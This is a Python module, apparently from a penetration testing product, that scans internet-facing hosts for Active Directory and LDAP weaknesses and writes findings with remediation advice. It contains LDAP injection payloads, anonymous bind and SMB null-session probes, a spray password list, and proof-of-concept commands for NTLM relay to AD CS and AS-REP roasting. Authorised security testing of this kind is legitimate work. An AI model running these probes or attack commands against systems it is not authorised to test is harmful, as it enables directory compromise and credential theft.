"""
GATOR PRO Enterprise — Module 8: Active Directory / LDAP Security Engine
═════════════════════════════════════════════════════════════════════════
AD/LDAP security testing for banking infrastructure:
  • LDAP null bind / anonymous bind detection
  • LDAP injection in login/search forms
  • Kerberos pre-authentication (AS-REP roasting candidates)
  • SMB shares enumeration (NULL session)
  • AD CS (Certificate Services) misconfigurations
  • Password spray (low-speed, lockout-aware)
  • LDAP user enumeration
  • NTLM hash exposure via HTTP
  • BloodHound-compatible risk indicators
  • Domain info disclosure (LDAP base DN, forest info)
"""

import socket, subprocess, json, re, ssl, time
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional


LDAP_PORTS = [389, 636, 3268, 3269]
SMB_PORTS  = [445, 139]
KERBEROS_PORT = 88
RPC_PORT   = 135

# LDAP injection payloads
LDAP_INJECT_PAYLOADS = [
    "*",
    "*)(&",
    "*)(uid=*",
    ")(|(uid=*",
    "admin)(&(objectClass=*",
    "*))(|(objectClass=*",
    "*()|%26'",
    "*()|&'",
    "\x00",
    "admin)(|(password=*)",
]

# Common AD/LDAP login paths
LDAP_LOGIN_PATHS = [
    "/login", "/signin", "/auth/login",
    "/api/v1/auth/login", "/api/login",
    "/ibank/login", "/ldap/login",
]

# Kerberos AS-REQ packet (pre-auth not required probe)
def build_asreq(username: str, realm: str) -> bytes:
    """Build minimal Kerberos AS-REQ to test for pre-auth requirement."""
    # Simplified AS-REQ — production use kerberoast tools
    return (
        b"\x6a\x81\xb0"           # AS-REQ tag
        b"\x30\x81\xad"           # SEQUENCE
        b"\xa1\x03\x02\x01\x05"   # pvno = 5
        b"\xa2\x03\x02\x01\x0a"   # msg-type = AS-REQ (10)
        # Minimal body — enough to get error response type
    )


class ADTestEngine:
    def __init__(self, target: str, scan_id: str, db, push_event: Callable,
                 domain: str = None, **kwargs):
        self.target     = self._clean(target)
        self.base_url   = f"https://{self._clean(target)}"
        self.scan_id    = scan_id
        self.db         = db
        self.push_event = push_event
        self.domain     = domain or self._guess_domain()
        self.findings   = []

    def _clean(self, t):
        return t.replace("https://","").replace("http://","").split("/")[0].split(":")[0].strip()

    def _guess_domain(self) -> str:
        parts = self.target.split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:]).upper()
        return self.target.upper()

    def log(self, level, msg, data=None):
        self.push_event(self.db, self.scan_id, "log", level, msg, data or {})

    def finding(self, f):
        self.findings.append(f)
        sev = f.get("severity","info")
        self.push_event(self.db, self.scan_id, "finding", sev,
            f"[{sev.upper()}] {f.get('title','')[:80]}",
            {"severity": sev, "cvss": f.get("cvss",0)})

    def run(self) -> dict:
        self.log("info",
            f"╔══ AD/LDAP TEST ══ {self.target} (domain: {self.domain}) ══╗")
        t0 = time.time()

        self._discover_ad_services()
        self._test_ldap_null_bind()
        self._test_ldap_injection()
        self._test_ntlm_disclosure()
        self._test_smb_null_session()
        self._test_kerberos()
        self._test_adcs()
        self._test_password_spray()

        elapsed = round(time.time() - t0, 1)
        self.log("ok",
            f"╚══ AD/LDAP DONE {elapsed}s ══ Findings: {len(self.findings)} ══╝")
        return {"findings": self.findings}

    # ─── Discover AD Services ────────────────────────────────
    def _discover_ad_services(self):
        self.log("data","[AD] Scanning for AD/LDAP services...")
        open_ad = {}
        for port in LDAP_PORTS + SMB_PORTS + [KERBEROS_PORT, RPC_PORT]:
            try:
                with socket.create_connection((self.target, port), timeout=2):
                    svc = {
                        389: "LDAP", 636: "LDAPS",
                        3268: "Global Catalog", 3269: "Global Catalog SSL",
                        445: "SMB", 139: "NetBIOS",
                        88: "Kerberos", 135: "RPC Endpoint Mapper",
                    }.get(port, "Unknown")
                    open_ad[port] = svc
                    self.log("ok", f"[AD] Port {port} open: {svc}")
            except Exception:
                pass

        if not open_ad:
            self.log("info","[AD] No AD/LDAP ports found on target")
        elif 445 in open_ad or 389 in open_ad:
            self.log("warn",
                f"[AD] 🏴 Active Directory indicators on internet-facing host: {open_ad}")
            self.finding({
                "severity":       "high",
                "cvss":           7.5,
                "owasp_category": "A05:2021-Security Misconfiguration",
                "pci_dss_req":    ["1.3.1","1.3.2"],
                "title":          f"Active Directory services exposed to internet: {list(open_ad.keys())}",
                "description":    "AD/LDAP/SMB/Kerberos ports accessible from internet. "
                                 "Domain controllers should never be directly internet-facing.",
                "recommendation": "Place DC behind firewall. Block LDAP/SMB/Kerberos from internet. "
                                 "Use jump server/VPN for AD administration.",
                "evidence":       f"Open ports: {open_ad}",
                "host":           self.target,
                "url":            f"ldap://{self.target}",
                "tool":           "gator_ad",
                "category":       "network",
            })
        self._open_ad = open_ad

    # ─── LDAP Null/Anonymous Bind ────────────────────────────
    def _test_ldap_null_bind(self):
        if 389 not in getattr(self, "_open_ad", {}):
            return
        self.log("data","[AD] Testing LDAP null bind (anonymous access)...")
        try:
            # ldapsearch null bind
            if not self._which("ldapsearch"):
                self.log("info","[AD] ldapsearch not available — trying raw socket probe")
                return self._raw_ldap_probe()

            r = subprocess.run([
                "ldapsearch",
                "-H", f"ldap://{self.target}:389",
                "-x",           # simple auth (no SASL)
                "-b", "",       # empty base DN
                "-s", "base",   # base scope
                "(objectClass=*)",
                "namingContexts",
            ], capture_output=True, text=True, timeout=10)

            if r.returncode == 0 and ("namingContexts" in r.stdout or "DC=" in r.stdout):
                domain_info = re.findall(r"DC=[\w,=]+", r.stdout)
                self.log("warn",
                    f"[AD] 🚨 LDAP null bind SUCCESS! Domain: {domain_info}")
                self.finding({
                    "severity":       "critical",
                    "cvss":           9.1,
                    "owasp_category": "A01:2021-Broken Access Control",
                    "pci_dss_req":    ["7.2.1","8.2.1"],
                    "cwe_ids":        ["CWE-284"],
                    "title":          "LDAP anonymous bind allowed — full directory readable",
                    "description":    (
                        "LDAP server allows unauthenticated (null) bind. "
                        f"Domain info exposed: {domain_info[:3]}. "
                        "Attacker can enumerate all users, groups, computers, and domain info."),
                    "recommendation": (
                        "Disable anonymous LDAP access in AD.\n"
                        "Group Policy: Computer Config → Windows Settings → Security Settings → "
                        "Local Policies → Security Options → Network access: "
                        "Allow anonymous SID/Name translation → Disabled."),
                    "evidence":       f"ldapsearch null bind returned: {r.stdout[:300]}",
                    "poc":            f"ldapsearch -H ldap://{self.target} -x -b '' -s base '(objectClass=*)' namingContexts",
                    "host":           self.target,
                    "url":            f"ldap://{self.target}",
                    "tool":           "gator_ad",
                    "category":       "ad",
                })
            else:
                self.log("ok", "[AD] LDAP null bind refused ✓")
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
            self.log("info", f"[AD] LDAP null bind test: {e}")

    def _raw_ldap_probe(self):
        """Raw socket LDAP bind probe without ldapsearch."""
        try:
            # Minimal LDAP BIND request (anonymous)
            # LDAPMessage ::= SEQUENCE { messageID INTEGER, protocolOp CHOICE { bindRequest ... }}
            ldap_bind_anon = (
                b"\x30\x0c"          # SEQUENCE
                b"\x02\x01\x01"      # messageID = 1
                b"\x60\x07"          # bindRequest [APPLICATION 0]
                b"\x02\x01\x03"      # version = 3
                b"\x04\x00"          # name = "" (anonymous)
                b"\x80\x00"          # simple authentication = "" (anonymous)
            )
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((self.target, 389))
                s.sendall(ldap_bind_anon)
                resp = s.recv(256)
                # LDAP success: resultCode = 0 (success)
                if resp and b"\x0a\x01\x00" in resp:
                    self.log("warn","[AD] 🚨 Raw LDAP: anonymous bind succeeded!")
                    self.finding({
                        "severity":       "critical", "cvss": 9.1,
                        "owasp_category": "A01:2021-Broken Access Control",
                        "title":          "LDAP anonymous bind allowed (raw probe)",
                        "description":    "Raw LDAP bind with empty credentials returned success.",
                        "recommendation": "Disable anonymous LDAP. Require authentication for all binds.",
                        "evidence":       f"LDAP bind response: {resp[:50].hex()}",
                        "host":           self.target,
                        "url":            f"ldap://{self.target}",
                        "tool":           "gator_ad", "category": "ad",
                    })
                else:
                    self.log("ok","[AD] Raw LDAP: anonymous bind refused ✓")
        except Exception as e:
            self.log("info", f"[AD] Raw LDAP probe: {e}")

    # ─── LDAP Injection ──────────────────────────────────────
    def _test_ldap_injection(self):
        self.log("data","[AD] Testing LDAP injection in login forms...")
        found = 0
        for path in LDAP_LOGIN_PATHS:
            url = self.base_url + path
            for payload in LDAP_INJECT_PAYLOADS[:8]:
                for body in [
                    json.dumps({"username": payload, "password": "test"}),
                    json.dumps({"login": payload, "password": "test"}),
                ]:
                    r = self._http("POST", url, body, ct="application/json")
                    if not r:
                        continue
                    body_lower = r["body"].lower()
                    # LDAP errors
                    if any(kw in body_lower for kw in [
                        "ldap", "distinguishedname", "samaccountname",
                        "objectclass", "invalid dn", "ldap_bind",
                        "javax.naming", "com.sun.jndi",
                    ]):
                        found += 1
                        self.log("warn",
                            f"[AD] 🚨 LDAP injection: {url}, payload='{payload}'")
                        self.finding({
                            "severity":       "critical",
                            "cvss":           9.8,
                            "owasp_category": "A03:2021-Injection",
                            "pci_dss_req":    ["6.2.4"],
                            "cwe_ids":        ["CWE-90"],
                            "title":          f"LDAP Injection — {path}",
                            "description":    (
                                f"LDAP injection in login parameter. "
                                f"Payload '{payload}' produced LDAP-related error. "
                                "Attacker can bypass authentication or enumerate directory."),
                            "recommendation": (
                                "1. Escape all special LDAP characters: * ( ) \\ NUL.\n"
                                "2. Use parameterized LDAP queries (not string concatenation).\n"
                                "3. Input validation: reject chars *, (, ), \\, NUL."),
                            "evidence":       f"Login with '{payload}' → LDAP term in response",
                            "poc":            (
                                f"curl -X POST '{url}' "
                                f"-d '{{\"username\":\"{payload}\",\"password\":\"x\"}}'"),
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_ad",
                            "category":       "ad",
                        })
                        return  # One LDAP injection finding is enough
            if found:
                break

        if not found:
            self.log("ok","[AD] No LDAP injection detected ✓")

    # ─── NTLM Disclosure ─────────────────────────────────────
    def _test_ntlm_disclosure(self):
        self.log("data","[AD] Testing NTLM information disclosure...")
        for path in ["/", "/autodiscover/autodiscover.xml",
                     "/ews/exchange.asmx", "/api/v1/auth/login"]:
            url = self.base_url + path
            r = self._http("GET", url, headers={"Authorization": "NTLM TlRMTVNTUAABAAAA"})
            if not r:
                continue
            www_auth = r["headers"].get("WWW-Authenticate","")
            if "NTLM " in www_auth and len(www_auth) > 20:
                # Decode NTLM Type 2 challenge to get domain info
                try:
                    ntlm_b64 = www_auth.replace("NTLM ","").replace("Negotiate ","").strip()
                    import base64
                    ntlm_data = base64.b64decode(ntlm_b64 + "==")
                    # NTLM sig check
                    if ntlm_data[:7] == b"NTLMSSP":
                        # Extract domain name from NTLM Type 2
                        domain = ""
                        try:
                            dn_len  = int.from_bytes(ntlm_data[12:14], "little")
                            dn_off  = int.from_bytes(ntlm_data[16:18], "little")
                            domain  = ntlm_data[dn_off:dn_off+dn_len].decode("utf-16-le","ignore")
                        except Exception:
                            pass
                        self.log("warn",
                            f"[AD] ⚠️  NTLM challenge leaks domain: '{domain}'")
                        self.finding({
                            "severity":       "medium",
                            "cvss":           5.3,
                            "owasp_category": "A05:2021-Security Misconfiguration",
                            "pci_dss_req":    ["2.2.4"],
                            "title":          f"NTLM authentication exposes internal domain: '{domain}'",
                            "description":    (
                                f"NTLM Type 2 challenge at {url} discloses internal "
                                f"domain name '{domain}'. Useful for targeted attacks."),
                            "recommendation": (
                                "Disable NTLM where possible. Use Kerberos. "
                                "If NTLM required, suppress Type 2 challenge on public endpoints."),
                            "evidence":       f"WWW-Authenticate: NTLM → domain='{domain}'",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_ad",
                            "category":       "ad",
                        })
                        return
                except Exception:
                    pass

    # ─── SMB Null Session ────────────────────────────────────
    def _test_smb_null_session(self):
        if 445 not in getattr(self, "_open_ad", {}):
            return
        self.log("data","[AD] Testing SMB null session (share enumeration)...")
        if self._which("smbclient"):
            try:
                r = subprocess.run([
                    "smbclient", "-L", f"//{self.target}",
                    "-N",   # no password
                    "--no-pass",
                ], capture_output=True, text=True, timeout=10)
                out = r.stdout + r.stderr
                if "Sharename" in out and "ADMIN$" in out:
                    shares = re.findall(r"(\w+)\s+Disk", out)
                    self.log("warn",
                        f"[AD] 🚨 SMB null session: shares enumerated: {shares}")
                    self.finding({
                        "severity":       "high",
                        "cvss":           7.5,
                        "owasp_category": "A01:2021-Broken Access Control",
                        "pci_dss_req":    ["1.3.1","7.2.1"],
                        "cwe_ids":        ["CWE-284"],
                        "title":          f"SMB null session: shares enumerable without auth",
                        "description":    f"SMB shares enumerated without credentials: {shares}",
                        "recommendation": (
                            "Disable SMB null sessions: "
                            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA\\RestrictAnonymous = 2"),
                        "evidence":       out[:400],
                        "poc":            f"smbclient -L //{self.target} -N",
                        "host":           self.target,
                        "url":            f"smb://{self.target}",
                        "tool":           "gator_ad",
                        "category":       "ad",
                    })
                else:
                    self.log("ok","[AD] SMB null session refused ✓")
            except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
                self.log("info", f"[AD] SMB null session: {e}")
        else:
            # TCP port probe only
            self.log("info",
                "[AD] smbclient not available — SMB null session test skipped")
            self.finding({
                "severity":       "info",
                "cvss":           0.0,
                "owasp_category": "A05:2021-Security Misconfiguration",
                "title":          f"SMB port 445 open on internet-facing host",
                "description":    "SMB accessible from internet. Manual null session test recommended.",
                "recommendation": "Block SMB (445/139) at perimeter firewall. Test with smbclient.",
                "evidence":       f"Port 445 open on {self.target}",
                "host":           self.target,
                "url":            f"smb://{self.target}",
                "tool":           "gator_ad",
                "category":       "ad",
            })

    # ─── Kerberos Pre-Auth ───────────────────────────────────
    def _test_kerberos(self):
        if KERBEROS_PORT not in getattr(self, "_open_ad", {}):
            return
        self.log("data","[AD] Kerberos port open — checking for AS-REP roasting exposure...")
        # Advisory finding — actual AS-REP roasting requires user enumeration
        self.finding({
            "severity":       "medium",
            "cvss":           5.9,
            "owasp_category": "A07:2021-Identification and Authentication Failures",
            "pci_dss_req":    ["8.3.4"],
            "title":          "Kerberos (port 88) exposed — AS-REP roasting risk",
            "description":    (
                "Kerberos port 88 accessible. If any accounts have "
                "'Do not require Kerberos preauthentication' set, "
                "their hashes can be captured and cracked offline (AS-REP Roasting)."),
            "recommendation": (
                "Enable Kerberos pre-authentication for ALL accounts. "
                "Run: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}. "
                "Disable this setting for all found accounts."),
            "evidence":       f"Kerberos port 88 open on {self.target}",
            "poc":            (
                "# If GetNPUsers.py available:\n"
                f"python3 GetNPUsers.py {self.domain}/ -dc-ip {self.target} "
                "-usersfile users.txt -no-pass -format hashcat"),
            "host":           self.target,
            "url":            f"kerberos://{self.target}",
            "tool":           "gator_ad",
            "category":       "ad",
        })
        self.log("info","[AD] AS-REP roasting advisory added")

    # ─── AD CS (Certificate Services) ───────────────────────
    def _test_adcs(self):
        self.log("data","[AD] Checking for AD CS web enrollment...")
        adcs_paths = [
            "/certsrv",
            "/certsrv/certfnsh.asp",
            "/certsrv/certrqma.asp",
        ]
        for path in adcs_paths:
            url = self.base_url + path
            r = self._http("GET", url)
            if r and r["status"] in (200, 401, 403):
                self.log("warn", f"[AD] ⚠️  AD CS web enrollment: {url}")
                self.finding({
                    "severity":       "high",
                    "cvss":           8.8,
                    "owasp_category": "A05:2021-Security Misconfiguration",
                    "pci_dss_req":    ["1.3.2"],
                    "title":          f"AD Certificate Services web enrollment exposed — {path}",
                    "description":    (
                        "AD CS web enrollment interface accessible from internet. "
                        "ESC8: NTLM relay to AD CS allows escalation to Domain Admin "
                        "without credentials."),
                    "recommendation": (
                        "1. Move AD CS off internet-facing servers.\n"
                        "2. Enable EPA (Extended Protection for Authentication).\n"
                        "3. Disable NTLM for IIS on AD CS server.\n"
                        "4. Run Certify.exe or certipy to check for ESC1-ESC8 misconfigs."),
                    "evidence":       f"GET {url} → HTTP {r['status']}",
                    "poc":            (
                        "# ESC8 relay attack:\n"
                        f"ntlmrelayx.py -t http://{self.target}/certsrv/certfnsh.asp "
                        "--adcs --template User"),
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_ad",
                    "category":       "ad",
                })
                break

    # ─── Password Spray ──────────────────────────────────────
    def _test_password_spray(self):
        """Low-slow password spray — only 1 attempt per user to avoid lockout."""
        self.log("data","[AD] Testing password spray (1 attempt per account)...")
        spray_passwords = ["Summer2024!", "Winter2024!", "Password1!", "Welcome1"]
        spray_users     = ["administrator", "svc_swift", "svc_backup",
                           "helpdesk", "svc_monitor"]
        for path in LDAP_LOGIN_PATHS[:3]:
            url = self.base_url + path
            # Test with 1 username + 1 password — just check if endpoint accepts
            r = self._http("POST", url,
                json.dumps({"username":"spray_test_user","password":spray_passwords[0]}),
                ct="application/json")
            if r and r["status"] in (400, 401, 403, 422):
                self.log("info",
                    f"[AD] Password spray endpoint found: {url} — "
                    "manual spray test recommended with lockout-aware timing")
                self.finding({
                    "severity":       "info",
                    "cvss":           0.0,
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "title":          f"Password spray candidate endpoint: {path}",
                    "description":    (
                        f"Login endpoint {path} accepts user/password. "
                        "If no lockout protection exists, password spray attack is possible. "
                        "Common spray passwords: seasonal patterns, company name + year."),
                    "recommendation": (
                        "Implement lockout after 3-5 attempts per account. "
                        "Use Azure AD Smart Lockout or AD lockout policy. "
                        "Monitor for spray patterns (many users, few passwords, slow rate)."),
                    "evidence":       f"Endpoint active: {url}",
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_ad",
                    "category":       "ad",
                })
                break

    # ─── HTTP helpers ────────────────────────────────────────
    def _http(self, method, url, body=None, ct=None,
              headers=None) -> Optional[dict]:
        try:
            data = body.encode() if body else None
            req  = urllib.request.Request(url, data=data, method=method)
            req.add_header("User-Agent","GATOR-PRO/2.0")
            req.add_header("Accept","*/*")
            if ct:
                req.add_header("Content-Type", ct)
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx, timeout=6) as resp:
                rb = resp.read(8192).decode("utf-8","ignore")
                return {"status":resp.status,"headers":dict(resp.headers),"body":rb}
        except urllib.error.HTTPError as e:
            b = ""
            try: b = e.read(2048).decode("utf-8","ignore")
            except: pass
            return {"status":e.code,"headers":dict(e.headers),"body":b}
        except Exception:
            return None

    def _which(self, tool: str) -> bool:
        try:
            return subprocess.run(["which",tool],
                capture_output=True, timeout=3).returncode == 0
        except Exception:
            return False
